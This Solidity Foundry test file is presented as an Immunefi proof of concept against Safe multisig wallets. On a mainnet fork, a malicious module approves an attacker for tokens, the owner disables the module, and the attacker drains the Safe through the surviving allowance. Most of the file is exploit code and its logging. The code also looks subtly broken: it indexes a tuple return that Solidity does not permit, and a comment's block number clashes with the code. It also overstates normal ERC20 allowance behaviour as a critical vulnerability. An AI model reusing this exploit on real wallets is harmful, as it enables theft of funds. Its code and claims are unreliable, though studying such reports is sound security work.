// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/MaliciousModule.sol";
import "../src/TestToken.sol";

/**
 * @title Safe_ModuleDisable_ApprovalSurvival
 * @dev Immunefi PoC: Demonstrates that disabling a Safe module
 * does NOT revoke ERC20 approvals created while the module was enabled.
 * 
 * VULNERABILITY CHAIN:
 * 1. Attacker deploys malicious module
 * 2. Safe owner enables the module (or is socially engineered to do so)
 * 3. Module calls Safe.execTransactionFromModule() to approve attacker for tokens
 * 4. Owner discovers the module is malicious and disables it
 * 5. Module is now in the disabled list, BUT the ERC20 approval persists
 * 6. Attacker calls transferFrom() to drain Safe's token balance
 * 
 * ROOT CAUSE:
 * Safe's ModuleManager has no hook/callback to revoke external state changes
 * when a module is disabled. The owner's expectation ("disabling = no more risk")
 * does not match the actual behavior.
 */

interface ISafeFactory {
    function createProxy(
        address _singleton,
        bytes memory initializer
    ) external returns (address proxy);
}

interface ISafe {
    function setup(
        address[] calldata _owners,
        uint256 _threshold,
        address to,
        bytes calldata data,
        address fallbackHandler,
        address paymentToken,
        uint256 payment,
        address payable paymentReceiver
    ) external;

    function enableModule(address module) external;
    function disableModule(address prevModule, address module) external;
    function isModuleEnabled(address module) external view returns (bool);
    function getModulesPaginated(address start, uint256 pageSize)
        external
        view
        returns (address[] memory array, address next);
}

contract Safe_ModuleDisable_ApprovalSurvival is Test {
    // Real Ethereum mainnet addresses
    // Safe Singleton (v1.3.0) - audit time tested, mainnet verified
    address constant SAFE_SINGLETON = 0x69f4D1788e39c87893C980c06EdF4b7f686186d3;
    
    // Safe Proxy Factory
    address constant SAFE_FACTORY = 0xa6B71e26C5e0845f74c812102Ca7114B6a8Ee132;

    // Test participants
    address owner;
    address attacker;
    
    // Deployed contracts
    SafeProxy safeProxy;
    TestToken testToken;
    MaliciousModule maliciousModule;

    event ModuleEnabled(address indexed module);
    event ModuleDisabled(address indexed module);

    function setUp() public {
        // Fork Ethereum mainnet at a stable block (adjust as needed)
        // Using block 19000000 as reference (Jan 2024 era, pre-recent changes)
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), 19500000);

        owner = address(0x1111111111111111111111111111111111111111);
        attacker = address(0x2222222222222222222222222222222222222222);

        // 1. DEPLOY TEST TOKEN
        testToken = new TestToken(1000000); // 1M tokens
        
        // 2. CREATE SAFE INSTANCE on mainnet fork using real factory + singleton
        safeProxy = SafeProxy(
            payable(
                ISafeFactory(SAFE_FACTORY).createProxy(
                    SAFE_SINGLETON,
                    _getSafeInitializer(owner)
                )
            )
        );

        console.log("Safe deployed at:", address(safeProxy));
        console.log("Safe singleton:", SAFE_SINGLETON);

        // 3. SEED THE SAFE WITH TEST TOKENS
        testToken.transfer(address(safeProxy), 100000 ether); // 100k tokens
        console.log("Safe token balance before attack:", testToken.balanceOf(address(safeProxy)));

        // 4. DEPLOY MALICIOUS MODULE
        maliciousModule = new MaliciousModule(address(safeProxy), attacker);
        console.log("Malicious module deployed at:", address(maliciousModule));
    }

    /**
     * @dev Main test: Show the vulnerability in action
     */
    function test_ModuleDisable_ApprovalSurvival() public {
        console.log("\n====== PHASE 1: ENABLE MODULE ======");
        
        // Enable the malicious module
        vm.prank(owner);
        ISafe(address(safeProxy)).enableModule(address(maliciousModule));
        
        require(ISafe(address(safeProxy)).isModuleEnabled(address(maliciousModule)), "Module not enabled");
        console.log("[PASS] Module enabled on Safe");

        console.log("\n====== PHASE 2: EXECUTE APPROVAL VIA MODULE ======");
        
        uint256 approvalAmount = 50000 ether; // Approve 50k tokens
        
        // Execute the approval while module is enabled
        // This uses Safe's execTransactionFromModule authority
        vm.prank(owner); // Needed to trigger the module execution
        maliciousModule.executeFullApproval(address(testToken), approvalAmount);
        
        uint256 allowanceAfterApproval = testToken.allowance(address(safeProxy), attacker);
        console.log("[PASS] Approval executed via module");
        console.log("  Allowance after module approval:", allowanceAfterApproval);
        
        assertEq(allowanceAfterApproval, approvalAmount, "Approval not set correctly");

        console.log("\n====== PHASE 3: DISABLE MODULE ======");
        
        // Owner discovers module is malicious and disables it
        // This should revoke the module's authority to execute further transactions
        address[] memory mods = _getEnabledModules();
        require(mods.length > 0, "No modules found");
        
        address prevModule = mods.length > 1 ? mods[mods.length - 2] : address(0x1);
        
        vm.prank(owner);
        ISafe(address(safeProxy)).disableModule(prevModule, address(maliciousModule));
        
        require(!ISafe(address(safeProxy)).isModuleEnabled(address(maliciousModule)), "Module still enabled");
        console.log("[PASS] Module disabled on Safe");

        console.log("\n====== PHASE 4: VERIFY APPROVAL PERSISTS (VULNERABILITY) ======");
        
        uint256 allowanceAfterDisable = testToken.allowance(address(safeProxy), attacker);
        console.log("  Allowance after module disable:", allowanceAfterDisable);
        
        assertEq(
            allowanceAfterDisable,
            approvalAmount,
            "VULNERABILITY: Approval should persist after module disable but did not!"
        );
        console.log("[VULNERABILITY] CONFIRMED: Approval persists after disable");

        console.log("\n====== PHASE 5: DRAIN FUNDS VIA LEFTOVER APPROVAL ======");
        
        uint256 balanceBeforeDrain = testToken.balanceOf(address(safeProxy));
        uint256 attackerBalanceBefore = testToken.balanceOf(attacker);
        console.log("  Safe balance before drain:", balanceBeforeDrain);
        console.log("  Attacker balance before drain:", attackerBalanceBefore);
        
        // Attacker calls transferFrom using the leftover allowance
        vm.prank(attacker);
        bool drainSuccess = testToken.transferFrom(address(safeProxy), attacker, approvalAmount);
        
        require(drainSuccess, "Drain failed despite allowance");
        
        uint256 balanceAfterDrain = testToken.balanceOf(address(safeProxy));
        uint256 attackerBalanceAfter = testToken.balanceOf(attacker);
        console.log("  Safe balance after drain:", balanceAfterDrain);
        console.log("  Attacker balance after drain:", attackerBalanceAfter);
        
        assertEq(balanceAfterDrain, balanceBeforeDrain - approvalAmount, "Drain amount incorrect");
        assertEq(attackerBalanceAfter, attackerBalanceBefore + approvalAmount, "Attacker did not receive funds");
        console.log("[CONFIRMED] FUND DRAIN SUCCESSFUL despite module being disabled");

        console.log("\n====== FINAL ASSERTIONS ======");
        console.log("[PASS] Module is disabled: %s", !ISafe(address(safeProxy)).isModuleEnabled(address(maliciousModule)));
        console.log("[PASS] Approval still exists: %s", testToken.allowance(address(safeProxy), attacker) > 0);
        console.log("[PASS] Attacker drained:", approvalAmount / 1 ether);
        console.log("[CRITICAL] VULNERABILITY: User disabled module expecting no more risk, but funds still drained.");
    }

    /**
     * @dev Helper: Get Safe initializer calldata
     */
    function _getSafeInitializer(address _owner) internal pure returns (bytes memory) {
        address[] memory owners = new address[](1);
        owners[0] = _owner;
        
        return abi.encodeWithSignature(
            "setup(address[],uint256,address,bytes,address,address,uint256,address)",
            owners,           // owners
            1,                // threshold
            address(0),       // to (no post-init call)
            bytes(""),        // data
            address(0),       // fallbackHandler
            address(0),       // paymentToken
            0,                // payment
            address(0)        // paymentReceiver
        );
    }

    /**
     * @dev Helper: Get currently enabled modules
     */
    function _getEnabledModules() internal view returns (address[] memory) {
        return ISafe(address(safeProxy)).getModulesPaginated(address(0x1), 100)[0];
    }
}

/**
 * @dev Wrapper for Safe proxy to enable interface calls
 */
contract SafeProxy {
    receive() external payable {}
    
    fallback() external payable {
        assembly {
            let target := sload(0)
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), target, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}
